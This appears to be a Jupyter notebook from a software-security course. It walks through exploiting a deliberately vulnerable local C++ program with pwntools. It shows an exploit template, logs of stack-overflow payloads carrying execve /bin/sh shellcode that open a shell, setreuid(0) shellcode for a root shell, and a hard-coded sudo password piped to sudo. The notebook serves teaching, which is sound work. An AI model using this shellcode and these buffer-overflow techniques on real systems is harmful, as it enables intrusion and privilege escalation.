{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Python exploit code\n",
    "\n",
    "- Python is a popular language among security professionals\n",
    "- there are a lot of third-party libraries, frameworks and software created for security-related tasks (CTF, pen-testing, vulnerabiliy scanning, etc.) using Python\n",
    "- we'll use pwntools library - [https://github.com/Gallopsled/pwntools#readme](https://github.com/Gallopsled/pwntools#readme) for generating the exploit code template and exploiting our vulnerable target program\n",
    "- make sure pwntools is installed on your system\n",
    "- be familiar with the basics of pwntools framework using this notebook - [Pwntools Tutorials](./PwntoolsTutorials.ipynb)\n",
    "- we'll exploit `so_stdio.cpp` program in `demos/stack_overflow` folder"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\n",
      "#include <string.h>\n",
      "#include <sys/types.h>\n",
      "#include <stdlib.h>\n",
      "#include <unistd.h>\n",
      "#include <iostream>\n",
      "using namespace std;\n",
      "\n",
      "#define BUFSIZE 128\n",
      "\n",
      "using namespace std;\n",
      "\n",
      "void give_shell(){\n",
      "    system(\"/bin/sh\");\n",
      "}\n",
      "\n",
      "char * mgets(char *dst) {\n",
      "    char *ptr = dst;\n",
      "    int ch; \n",
      "\t/* skip leading white spaces */ \n",
      "    while ((ch = getchar()) && (ch == ' ' or ch == '\\t') )\n",
      "        ; \n",
      "\n",
      "    if ((ch == '\\n') or (ch == EOF)) { \n",
      "        *ptr = '\\0';\n",
      "        return dst; \n",
      "    } \n",
      "    else\n",
      "        *ptr = ch;\n",
      "\n",
      "    /* now read the rest until \\n or EOF */ \n",
      "    while (true) {\n",
      "        ch = getchar();\n",
      "        if (ch == '\\n' or ch == EOF) break;\n",
      "        *(++ptr) = ch; \n",
      "    }\n",
      "    *(++ptr) = 0;\n",
      "    return dst;\n",
      "}\n",
      "\n",
      "void bad() {\n",
      "    char buffer[BUFSIZE];\n",
      "    printf(\"buffer is at %p\\n\", buffer);\n",
      "    cout << \"Give me some text: \";\n",
      "    fflush(stdout);\n",
      "    mgets(buffer); // similar to C's gets;\n",
      "    //gets(buffer); // depricated\n",
      "    cout << \"Acknowledged: \" << buffer << \" with length \" << strlen(buffer) << endl;\n",
      "}\n",
      "\n",
      "int main(int argc, char *argv[]) {\n",
      "    bad();\n",
      "    cout << \"Good bye!\\n\";\n",
      "    return 0;\n",
      "}\n"
     ]
    }
   ],
   "source": [
    "! cat ./demos/stack_overflow/so_stdio.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "# compile the target program\n",
    "input=\"./demos/stack_overflow/so_stdio.cpp\"\n",
    "output=\"so_stdio.exe\"\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffbc60\n",
      "Give me some text: Acknowledged: Hello World with length 11\n",
      "Good bye!\n"
     ]
    }
   ],
   "source": [
    "! python -c 'print(\"Hello World\")' | ./so_stdio.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "buffer is at 0xffffbc60\n",
      "Give me some text: Acknowledged: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA with length 150\n"
     ]
    }
   ],
   "source": [
    "! python -c 'print(\"A\"*150)' | ./so_stdio.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- armed with this knowledge, let's see how to create a template and complete the exploit code using **pwntools**\n",
    "- the goal is to force the target program to execute **give_shell()**\n",
    "\n",
    "### Force the target program to execute give_shell( )\n",
    "- left as an exercise\n",
    "\n",
    "#### steps provided as hint\n",
    "1. creae a template\n",
    "2. find the offset required to overwrite the caller's return address\n",
    "3. find the address of **give_shell()**\n",
    "4. send some junk and the controlled address to execute **give_shell()**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Send payload containing shellcode\n",
    "\n",
    "- pwntools provides built-in functionalities to create payload with shellcode of choice and send it to the target program locally or remotely\n",
    "\n",
    "- let's demonstrate the exploition of demos/stack_overflow/so_stdio.cpp with pwntools"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat demos/stack_overflow/so_stdio.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwxr-xr-x 1 root root 31836 Apr 10 15:43 demos/stack_overflow/so_stdio.exe\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "input=\"demos/stack_overflow/so_stdio.cpp\"\n",
    "output=\"demos/stack_overflow/so_stdio.exe\"\n",
    "echo kali | sudo -S ./compile.sh $input $output\n",
    "ls -al $output"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- let's play with the program to learn what it does and how it works...\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ cd demos/stack_overflow \n",
    "\n",
    "┌──(kali㉿K)-[~/EthicalHacking/demos/stack_overflow]\n",
    "└─$ ./so_stdio.exe\n",
    "buffer is at 0xffffc320\n",
    "Give me some text: read this?\n",
    "Acknowledged: read this? with length 10\n",
    "Good bye!\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- we can now create an exploit code template using **pwn** and update it as necessary; let's create the template for local exploit (no remote code will be included!)\n",
    "\n",
    "```bash\n",
    "\n",
    "┌──(kali㉿K)-[~/EthicalHacking/demos/stack_overflow]\n",
    "└─$ pwn template ./so_stdio.exe > exploit_template.py  \n",
    "\n",
    "```\n",
    "\n",
    "- the template looks like the following to start with\n",
    "\n",
    "```python\n",
    "#!/usr/bin/env python\n",
    "# -*- coding: utf-8 -*-\n",
    "# This exploit template was generated via:\n",
    "# $ pwn template ./so_stdio.exe\n",
    "from pwn import *\n",
    "\n",
    "# Set up pwntools for the correct architecture\n",
    "exe = context.binary = ELF('./so_stdio.exe')\n",
    "\n",
    "# Many built-in settings can be controlled on the command-line and show up\n",
    "# in \"args\".  For example, to dump all data sent/received, and disable ASLR\n",
    "# for all created processes...\n",
    "# ./exploit.py DEBUG NOASLR\n",
    "\n",
    "\n",
    "def start(argv=[], *a, **kw):\n",
    "    '''Start the exploit against the target.'''\n",
    "    if args.GDB:\n",
    "        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)\n",
    "    else:\n",
    "        return process([exe.path] + argv, *a, **kw)\n",
    "\n",
    "# Specify your GDB script here for debugging\n",
    "# GDB will be launched if the exploit is run via e.g.\n",
    "# ./exploit.py GDB\n",
    "gdbscript = '''\n",
    "tbreak main\n",
    "continue\n",
    "'''.format(**locals())\n",
    "\n",
    "#===========================================================\n",
    "#                    EXPLOIT GOES HERE\n",
    "#===========================================================\n",
    "# Arch:     i386-32-little\n",
    "# RELRO:    Partial RELRO\n",
    "# Stack:    No canary found\n",
    "# NX:       NX disabled\n",
    "# PIE:      No PIE (0x8048000)\n",
    "# RWX:      Has RWX segments\n",
    "\n",
    "io = start()\n",
    "\n",
    "# shellcode = asm(shellcraft.sh())\n",
    "# payload = fit({\n",
    "#     32: 0xdeadbeef,\n",
    "#     'iaaa': [1, 2, 'Hello', 3]\n",
    "# }, length=128)\n",
    "# io.send(payload)\n",
    "# flag = io.recv(...)\n",
    "# log.success(flag)\n",
    "\n",
    "io.interactive()\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- find the offset using pwntools `cyclic` and `cyclic_find` API\n",
    "- Python script: demos/stack_overflow/find_offset.py does this for us\n",
    "- base address of buffer is conviniently printed for us; we can parse it in exploit code\n",
    "- we'll use the binary shellcode we've genereated from PEDA found in `shellcode/x-86-linux-sh.py` file\n",
    "- the final exploit code looks like the following"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat demos/stack_overflow/so_stdio_exploit.py"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- next is to just run the so_stdio_exploit.py from terminal where the target program and the exploit code reside\n",
    "- we'll get a shell!\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿)-[~/EthicalHacking/demos/stack_overflow]\n",
    "└─$ python so_stdio_exploit.py \n",
    "[*] '/home/kali/EthicalHacking/demos/stack_overflow/so_stdio.exe'\n",
    "    Arch:     i386-32-little\n",
    "    RELRO:    Partial RELRO\n",
    "    Stack:    No canary found\n",
    "    NX:       NX disabled\n",
    "    PIE:      No PIE (0x8048000)\n",
    "    RWX:      Has RWX segments\n",
    "[+] Starting local process './so_stdio.exe': pid 19331\n",
    "[+] Starting local process '/home/kali/EthicalHacking/demos/stack_overflow/so_stdio.exe': pid 19333\n",
    "[*] Process '/home/kali/EthicalHacking/demos/stack_overflow/so_stdio.exe' stopped with exit code -11 (SIGSEGV) (pid 19333)\n",
    "[+] Parsing corefile...: Done\n",
    "[*] '/home/kali/EthicalHacking/demos/stack_overflow/core.19333'\n",
    "    Arch:      i386-32-little\n",
    "    EIP:       0x61616161\n",
    "    ESP:       0xffffc1d0\n",
    "    Exe:       '/home/kali/EthicalHacking/demos/stack_overflow/so_stdio.exe' (0x8049000)\n",
    "    Fault:     0x61616161\n",
    "offset = 144\n",
    "[+] Starting local process '/home/kali/EthicalHacking/demos/stack_overflow/so_stdio.exe': pid 19336\n",
    "b'Give me some text: Acknowledged: \\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x901\\xc0Ph//shh/bin\\x89\\xe31\\xc9\\x89\\xcaj\\x0bX\\xcd\\x80@\\xc1\\xff\\xff@\\xc1\\xff\\xff@\\xc1\\xff\\xff@\\xc1\\xff\\xff@\\xc1\\xff\\xff with length 144\\n'\n",
    "[*] Switching to interactive mode\n",
    "$ id\n",
    "uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),133(scanner),141(kaboxer)\n",
    "$ date\n",
    "Sat Dec 19 11:43:44 MST 2020\n",
    "$ exit\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Automatically determining buffer address\n",
    "\n",
    "- in real world, buffer address will not be printed!\n",
    "- one can determine the buffer address using ESP\n",
    "- PEDA provides offset for ESP which is the payload length to completely overwrite EIP or return address\n",
    "- the offset to ESP can be automatically determined using pwntools's `cylic_find` API\n",
    "- let's look at the modified program where the line printing the buffer address is commented out\n",
    "- also the BUFSIZE is changed to 200"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat demos/stack_overflow/so_stdio_no_add.cpp"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Compile the program"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "# compile the target program\n",
    "input=\"./demos/stack_overflow/so_stdio_no_add.cpp\"\n",
    "output=\"./demos/stack_overflow/so_stdio_no_add.exe\"\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Generate and run the exploit code"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat ./demos/stack_overflow/so_stdio_no_add_exploit.py"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- execute the exploitcode from a terminal and get the shell!\n",
    "\n",
    "```bash\n",
    "──(kali㉿K)-[~/Sp22/SystemSecurity/demos/stack_overflow]\n",
    "└─$ python so_stdio_no_add_exploit.py\n",
    "[*] '/home/kali/Sp22/SystemSecurity/demos/stack_overflow/so_stdio_no_add.exe'\n",
    "    Arch:     i386-32-little\n",
    "    RELRO:    Partial RELRO\n",
    "    Stack:    No canary found\n",
    "    NX:       NX disabled\n",
    "    PIE:      No PIE (0x8048000)\n",
    "    RWX:      Has RWX segments\n",
    "[+] Starting local process '/home/kali/Sp22/SystemSecurity/demos/stack_overflow/so_stdio_no_add.exe': pid 739836\n",
    "[*] Process '/home/kali/Sp22/SystemSecurity/demos/stack_overflow/so_stdio_no_add.exe' stopped with exit code -11 (SIGSEGV) (pid 739836)\n",
    "[+] Parsing corefile...: Done\n",
    "[*] '/home/kali/Sp22/SystemSecurity/demos/stack_overflow/core.739836'\n",
    "    Arch:      i386-32-little\n",
    "    EIP:       0x63616164\n",
    "    ESP:       0xffffc280\n",
    "    Exe:       '/home/kali/Sp22/SystemSecurity/demos/stack_overflow/so_stdio_no_add.exe' (0x8048000)\n",
    "    Fault:     0x63616164\n",
    "payload_len = 216\n",
    "ESP is at ffffc280\n",
    "EIP contains 63616164\n",
    "[+] Starting local process '/home/kali/Sp22/SystemSecurity/demos/stack_overflow/so_stdio_no_add.exe': pid 739839\n",
    "buffer address is at: ffffc1a8\n",
    "[*] Switching to interactive mode\n",
    "Give me some text: Acknowledged: \\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x901\\xc0Ph//shh/bin\\x89\\xe31\\xc9\\x89\\xcaj\\x0b\\xa8\\xc1\\xff\\xff\\xa8\\xc1\\xff\\xff\\xa8\\xc1\\xff\\xff\\xa8\\xc1\\xff\\xff\\xa8\\xc1\\xff\\xff with length 216\n",
    "$ whoami\n",
    "kali\n",
    "$ exit\n",
    "[*] Got EOF while reading in interactive\n",
    "$ \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Getting root shellcode\n",
    "\n",
    "- user shellcode gives your root shell if you create a soft link /bin/sh pointing to /bin/zsh\n",
    "- use the root shellcode provided in the shellcode folder\n",
    "- can also create setuid binary using pwntools and prepend it to the regular user shell\n",
    "- make sure target program is root owned \n",
    "- set seteuid of the target program\n",
    "- generate setuid binary using pwntools's shellcraft\n",
    "- prepend the bytes generated to the user root shell\n",
    "\n",
    "```bash\n",
    "(base) ┌──(kali㉿kali)-[~/Sp23/SoftwareSecurity/demos/stack_overflow]\n",
    "└─$ shellcraft -f d i386.linux.setreuid 0\n",
    "\\x31\\xdb\\x6a\\x46\\x58\\x89\\xd9\\xcd\\x80\n",
    "```\n",
    "- change the core pattern to make sure core.%p is the pattern\n",
    "\n",
    "```bash\n",
    "echo kali | sudo -S sysctl -w kernel.core_pattern=core.%p\n",
    "```\n",
    "- set ulimit to unlimited\n",
    "\n",
    "\n",
    "### coredump of setuid programs\n",
    "- must run the exploit_code with sudo to read the coredump of setuid programs\n",
    "\n",
    "- run the exploit code as root\n",
    "\n",
    "```bash\n",
    "sudo python so_stdio_no_add_exploit.py\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Challenge\n",
    "\n",
    "1. Create Python exploit code to get a root shell (instead of the user shell)\n",
    "    - Hint - create a template similar to the demo\n",
    "    - automatically find the controlled return address\n",
    "    - test to make sure the exploit code works\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
